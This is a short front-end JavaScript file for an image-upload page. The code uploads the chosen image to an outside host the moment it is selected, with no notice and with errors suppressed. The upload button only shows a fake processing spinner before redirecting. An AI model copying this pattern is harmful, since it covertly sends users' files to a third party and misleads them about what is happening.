// Function to display the selected image in the image-preview element
function displaySelectedImage() {
    const fileInput = document.getElementById('image-upload');
    const imagePreview = document.getElementById('preview-image');

    if (fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const imageURL = URL.createObjectURL(file);
        imagePreview.src = imageURL;
        imagePreview.style.display = 'block';

        // Hide other elements in the image-upload-window
        const uploadIcon = document.querySelector('.upload-icon');
        const uploadText = document.querySelector('.upload-text');
        uploadIcon.style.display = 'none';
        uploadText.style.display = 'none';

        // Automatically upload the selected image
        uploadImage(file);
    }
}

function uploadImage(file) {
    const formData = new FormData();
    formData.append('image', file);

    fetch('https://buyapp.rf.gd/api/', {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        // No message displayed
    })
    .catch(error => {
        // No message displayed
    });
}

function showProcessingSpinner() {
    // Display the processing spinner for 3 seconds (3000 milliseconds)
    const spinner = document.createElement('div');
    spinner.className = 'processing-spinner';
    document.body.appendChild(spinner);
    setTimeout(() => {
        document.body.removeChild(spinner);
        // Redirect to the specified link after 3 seconds
        window.location.href = '../warning';
    }, 3000);
}

// Attach an event listener to the file input to display the selected image
document.getElementById('image-upload').addEventListener('change', displaySelectedImage);

// Attach an event listener to the upload button
document.getElementById('upload-button').addEventListener('click', showProcessingSpinner);